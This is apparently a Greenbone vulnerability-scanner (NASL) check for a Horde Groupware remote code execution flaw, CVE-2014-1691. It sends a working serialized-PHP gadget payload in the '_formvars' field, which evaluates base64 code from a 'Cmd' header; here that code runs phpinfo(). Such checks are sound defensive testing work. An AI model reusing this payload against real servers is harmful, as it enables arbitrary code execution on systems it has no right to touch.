# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:horde:horde_groupware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103926");
  script_cve_id("CVE-2014-1691");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("2024-06-28T15:38:46+0000");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Horde '_formvars' Form Input RCE Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65200");
  script_xref(name:"URL", value:"http://www.horde.org");

  script_tag(name:"last_modification", value:"2024-06-28 15:38:46 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2014-03-21 11:45:12 +0100 (Fri, 21 Mar 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("horde_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("horde/installed");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary code within the context
of the affected application. Failed exploit attempts may result in denial-of-service conditions.");

  script_tag(name:"vuldetect", value:"Try to execute the phpinfo() command by sending a special crafted HTTP POST
request.");

  script_tag(name:"insight", value:"Horde could allow a remote attacker to execute arbitrary code on the system,
caused by the improper validation of _formvars form input.");

  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"summary", value:"Horde is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"affected", value:"Horde 3.1.x through versions 5.1.1 are vulnerable, other versions may
also be affected.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if (!port = get_app_port(cpe: CPE))
  exit( 0 );

if (!dir = get_app_location( cpe:CPE, port:port))
  exit( 0 );

useragent = http_get_user_agent();
host = http_host_name(port:port);

formwars = '_formvars=O%3a34%3a%22Horde_Kolab_Server_Decorator_Clean%22%3a2%3a%7bs%3a43%3a%22%00Horde_Kolab_Server_Decorator_Clean%00'       +
           '_server%22%3bO%3a20%3a%22Horde_Prefs_Identity%22%3a2%3a%7bs%3a9%3a%22%00%2a%00_prefs%22%3bO%3a11%3a%22Horde_Prefs%22%3a2%3a'     +
           '%7bs%3a8%3a%22%00%2a%00_opts%22%3ba%3a1%3a%7bs%3a12%3a%22sizecallback%22%3ba%3a2%3a%7bi%3a0%3bO%3a12%3a%22Horde_Config%22%3a'    +
           '1%3a%7bs%3a13%3a%22%00%2a%00_oldConfig%22%3bs%3a46%3a%22eval%28base64_decode%28%24_SERVER%5bHTTP_CMD%5d%29%29%3bdie%28%29%3b'    +
           '%22%3b%7di%3a1%3bs%3a13%3a%22readXMLConfig%22%3b%7d%7ds%3a10%3a%22%00%2a%00_scopes%22%3ba%3a1%3a%7bs%3a5%3a%22horde%22%3bO%3'    +
           'a17%3a%22Horde_Prefs_Scope%22%3a1%3a%7bs%3a9%3a%22%00%2a%00_prefs%22%3ba%3a1%3a%7bi%3a0%3bi%3a1%3b%7d%7d%7d%7ds%3a13%3a%22'      +
           '%00%2a%00_prefnames%22%3ba%3a1%3a%7bs%3a10%3a%22identities%22%3bi%3a0%3b%7d%7ds%3a42%3a%22%00Horde_Kolab_Server_Decorator_Clean' +
           '%00_added%22%3ba%3a1%3a%7bi%3a0%3bi%3a1%3b%7d%7d';

len = strlen( formwars );

req = 'POST ' + dir + '/login.php HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Cmd: cGhwaW5mbygpO2RpZTsK\r\n' + # phpinfo();die;
      'Content-Type: application/x-www-form-urlencoded\r\n' +
      'Content-Length: ' + len + '\r\n' +
      '\r\n' +
      formwars;
buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

if( "<title>phpinfo()" >< buf )
{
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
